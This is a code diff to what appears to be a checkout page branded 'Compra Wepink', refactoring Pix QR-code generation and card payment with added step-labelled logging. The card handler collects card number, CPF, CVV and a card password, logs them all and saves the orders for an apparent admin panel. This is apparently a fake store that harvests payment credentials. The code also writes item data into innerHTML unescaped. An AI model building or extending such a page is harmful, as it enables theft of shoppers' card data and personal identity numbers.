@@ -1113,103 +1113,78 @@
     }
 
     function updateOrderSummary() {
-      const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
-      const orderItems = document.getElementById('order-items');
-      const deliveryFeeElement = document.getElementById('delivery-fee');
-      const orderTotalElement = document.getElementById('order-total');
-
-      console.log('Dados de pendingPurchase ao carregar payment.html:', purchase);
-
-      if (!purchase || !purchase.cartItems || purchase.cartItems.length === 0) {
-        console.error('Nenhum item encontrado no carrinho. Redirecionando para product.html');
-        showErrorScreen('Nenhum item encontrado no carrinho. Você será redirecionado.');
-        setTimeout(() => window.location.href = 'product.html', 3000);
-        return;
-      }
-
-      let subtotal = 0;
-      orderItems.innerHTML = '';
-      purchase.cartItems.forEach(item => {
-        if (item.priceNew && item.quantity) {
-          const itemTotal = item.priceNew * item.quantity;
-          subtotal += itemTotal;
-          const itemElement = document.createElement('div');
-          itemElement.className = 'order-item';
-          itemElement.innerHTML = `
-            <img src="${item.image || 'https://via.placeholder.com/70'}" alt="${item.name || 'Produto'}">
-            <div class="order-item-details">
-              <p>${item.name || 'Produto'}</p>
-              <p>Quantidade: ${item.quantity}</p>
-              <p class="price">${formatCurrency(itemTotal)}</p>
-            </div>
-          `;
-          orderItems.appendChild(itemElement);
-        }
-      });
-
-      const fee = purchase.address?.deliveryFee || 0;
-      const total = subtotal + fee;
-      deliveryFeeElement.textContent = formatCurrency(fee);
-      orderTotalElement.textContent = formatCurrency(total);
-      console.log('Resumo do pedido atualizado:', { subtotal, fee, total, purchase });
-
-      localStorage.setItem('lastPaymentTotal', total);
-    }
-
-    function validatePixForm() {
-      const nameInput = document.getElementById('pix-payer-name');
-      const cpfInput = document.getElementById('pix-payer-cpf');
-      const emailInput = document.getElementById('pix-email-input');
-      const generateButton = document.getElementById('generate-pix-button');
-      const errors = {
-        name: document.getElementById('error-pix-payer-name'),
-        cpf: document.getElementById('error-pix-payer-cpf'),
-        email: document.getElementById('error-pix-email-input')
-      };
-
-      let isValid = true;
-
-      if (!nameInput.value.trim() || nameInput.value.trim().length < 3) {
-        nameInput.classList.add('invalid');
-        errors.name.textContent = 'Nome deve ter pelo menos 3 caracteres.';
-        errors.name.classList.add('visible');
-        isValid = false;
-      } else {
-        nameInput.classList.remove('invalid');
-        errors.name.classList.remove('visible');
-      }
-
-      const cpf = cpfInput.value.replace(/\D/g, '');
-      if (cpf.length !== 11) {
-        cpfInput.classList.add('invalid');
-        errors.cpf.textContent = 'CPF deve conter exatamente 11 dígitos.';
-        errors.cpf.classList.add('visible');
-        isValid = false;
-      } else {
-        cpfInput.classList.remove('invalid');
-        errors.cpf.classList.remove('visible');
-      }
-
-      if (!emailInput.value.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim())) {
-        emailInput.classList.add('invalid');
-        errors.email.textContent = 'Por favor, insira um e-mail válido.';
-        errors.email.classList.add('visible');
-        isValid = false;
-      } else {
-        emailInput.classList.remove('invalid');
-        errors.email.classList.remove('visible');
-      }
-
-      generateButton.disabled = !isValid;
-    }
-
-    async function generatePixQRCode() {
   const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
-  const nameInput = document.getElementById('pix-payer-name').value.trim();
-  const cpfInput = document.getElementById('pix-payer-cpf').value.trim();
-  const emailInput = document.getElementById('pix-email-input').value.trim();
+  const orderItems = document.getElementById('order-items');
+  const deliveryFeeElement = document.getElementById('delivery-fee');
+  const orderTotalElement = document.getElementById('order-total');
+
+  console.log('Passo 3: Dados de pendingPurchase ao carregar payment.html:', purchase);
+
+  if (!purchase || !purchase.cartItems || purchase.cartItems.length === 0 || !purchase.address) {
+    console.error('Passo 3: Dados do pedido não encontrados em pendingPurchase:', purchase);
+    showErrorScreen('Nenhum item encontrado no carrinho ou endereço não preenchido. Você será redirecionado.');
+    setTimeout(() => window.location.href = 'product.html', 3000);
+    return;
+  }
+
+  let subtotal = 0;
+  orderItems.innerHTML = '';
+  purchase.cartItems.forEach(item => {
+    if (item.priceNew && item.quantity) {
+      const itemTotal = item.priceNew * item.quantity;
+      subtotal += itemTotal;
+      const itemElement = document.createElement('div');
+      itemElement.className = 'order-item';
+      itemElement.innerHTML = `
+        <img src="${item.image || 'https://via.placeholder.com/70'}" alt="${item.name || 'Produto'}">
+        <div class="order-item-details">
+          <p>${item.name || 'Produto'}</p>
+          <p>Quantidade: ${item.quantity}</p>
+          <p class="price">${formatCurrency(itemTotal)}</p>
+        </div>
+      `;
+      orderItems.appendChild(itemElement);
+    }
+  });
+
+  const fee = purchase.address?.deliveryFee || 0;
+  const total = subtotal + fee;
+  deliveryFeeElement.textContent = formatCurrency(fee);
+  orderTotalElement.textContent = formatCurrency(total);
+  console.log('Passo 3: Resumo do pedido atualizado:', { subtotal, fee, total, purchase });
+
+  localStorage.setItem('lastPaymentTotal', total);
+}
+
+async function generatePixQRCode() {
+  const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
+  const nameInput = document.getElementById('pix-payer-name');
+  const cpfInput = document.getElementById('pix-payer-cpf');
+  const emailInput = document.getElementById('pix-email-input');
   const qrImage = document.getElementById('pix-qr-image');
   const generateButton = document.getElementById('generate-pix-button');
+
+  const name = nameInput.value.trim();
+  const cpf = cpfInput.value.replace(/\D/g, '');
+  const email = emailInput.value.trim();
+
+  if (!name || name.length < 3) {
+    console.error('Passo 3: Nome inválido:', name);
+    showErrorScreen('Erro: Nome deve ter pelo menos 3 caracteres.');
+    return;
+  }
+
+  if (cpf.length !== 11) {
+    console.error('Passo 3: CPF inválido:', cpf);
+    showErrorScreen('Erro: CPF deve conter exatamente 11 dígitos.');
+    return;
+  }
+
+  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    console.error('Passo 3: E-mail inválido:', email);
+    showErrorScreen('Erro: Por favor, insira um e-mail válido (ex.: teste@gmail.com).');
+    return;
+  }
 
   let subtotal = 0;
   purchase.cartItems.forEach(item => {
@@ -1220,21 +1195,15 @@
   const totalAmount = subtotal + (purchase.address?.deliveryFee || 0);
 
   if (totalAmount <= 0) {
-    console.error('Valor do pedido inválido:', totalAmount);
+    console.error('Passo 3: Valor do pedido inválido:', totalAmount);
     showErrorScreen('Erro: Valor do pedido inválido. Verifique os itens no carrinho.');
-    return;
-  }
-
-  if (!emailInput || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput)) {
-    console.error('E-mail inválido:', emailInput);
-    showErrorScreen('Erro: Por favor, insira um e-mail válido.');
     return;
   }
 
   const paymentData = {
     amount: parseFloat(totalAmount.toFixed(2)),
     description: 'Compra Wepink',
-    email: emailInput
+    email: email
   };
 
   try {
@@ -1273,10 +1242,10 @@
       purchaseData: purchase,
       paymentMethod: 'Pix',
       pixDetails: {
-        email: emailInput,
-        first_name: nameInput.split(' ')[0] || 'Nome',
-        last_name: nameInput.split(' ').slice(1).join(' ') || 'Sobrenome',
-        identification: { type: 'CPF', number: cpfInput },
+        email: email,
+        first_name: name.split(' ')[0] || 'Nome',
+        last_name: name.split(' ').slice(1).join(' ') || 'Sobrenome',
+        identification: { type: 'CPF', number: cpf },
         qrCode: data.qrCode,
         amount: totalAmount,
         status: 'Gerado'
@@ -1294,11 +1263,11 @@
     };
     orders.push(newOrder);
     localStorage.setItem('adminOrders', JSON.stringify(orders));
-    console.log('Código PIX gerado com sucesso e pedido salvo:', newOrder);
+    console.log('Passo 3: Código PIX gerado com sucesso e pedido salvo:', newOrder);
 
     const savedOrders = JSON.parse(localStorage.getItem('adminOrders'));
     if (!savedOrders || savedOrders.length === 0) {
-      console.error('Erro ao salvar adminOrders:', savedOrders);
+      console.error('Passo 3: Erro ao salvar adminOrders:', savedOrders);
       showErrorScreen('Erro ao salvar o pedido. Tente novamente.');
       return;
     }
@@ -1307,7 +1276,7 @@
       showPaymentForm('pix');
     }, 30000);
   } catch (error) {
-    console.error('Erro ao gerar Pix:', error.message);
+    console.error('Passo 3: Erro ao gerar Pix:', error.message);
     showErrorScreen(`Erro ao gerar Pix: ${error.message}`);
   } finally {
     generateButton.disabled = false;
@@ -1328,7 +1297,7 @@ function processCardPayment() {
   const confirmButton = document.getElementById('confirm-payment-button');
 
   if (cardNumber.length !== 16 || cardCPF.length !== 11 || !expMonth || !expYear || cvv.length < 3 || cvv.length > 4 || !password || isNaN(total) || total <= 0 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cardEmail)) {
-    console.error('Dados do cartão inválidos:', { cardNumber, cardCPF, cardEmail, expMonth, expYear, cvv, password, total });
+    console.error('Passo 3: Dados do cartão inválidos:', { cardNumber, cardCPF, cardEmail, expMonth, expYear, cvv, password, total });
     showErrorScreen('Erro: Verifique os dados do cartão e tente novamente.');
     return;
   }
@@ -1366,11 +1335,11 @@ function processCardPayment() {
     };
     orders.push(newOrder);
     localStorage.setItem('adminOrders', JSON.stringify(orders));
-    console.log('Pagamento via cartão processado e pedido salvo:', newOrder);
+    console.log('Passo 3: Pagamento via cartão processado e pedido salvo:', newOrder);
 
     const savedOrders = JSON.parse(localStorage.getItem('adminOrders'));
     if (!savedOrders || savedOrders.length === 0) {
-      console.error('Erro ao salvar adminOrders:', savedOrders);
+      console.error('Passo 3: Erro ao salvar adminOrders:', savedOrders);
       showErrorScreen('Erro ao salvar o pedido. Tente novamente.');
       return;
     }
@@ -1379,7 +1348,7 @@ function processCardPayment() {
     localStorage.removeItem('pendingPurchase');
     localStorage.removeItem('cartItems');
     localStorage.removeItem('cartAddress');
-    console.log('Dados do localStorage limpos após pagamento com cartão');
+    console.log('Passo 3: Dados do localStorage limpos após pagamento com cartão');
 
     document.body.classList.add('fade-out');
     setTimeout(() => window.location.href = 'confirmation.html', 500);
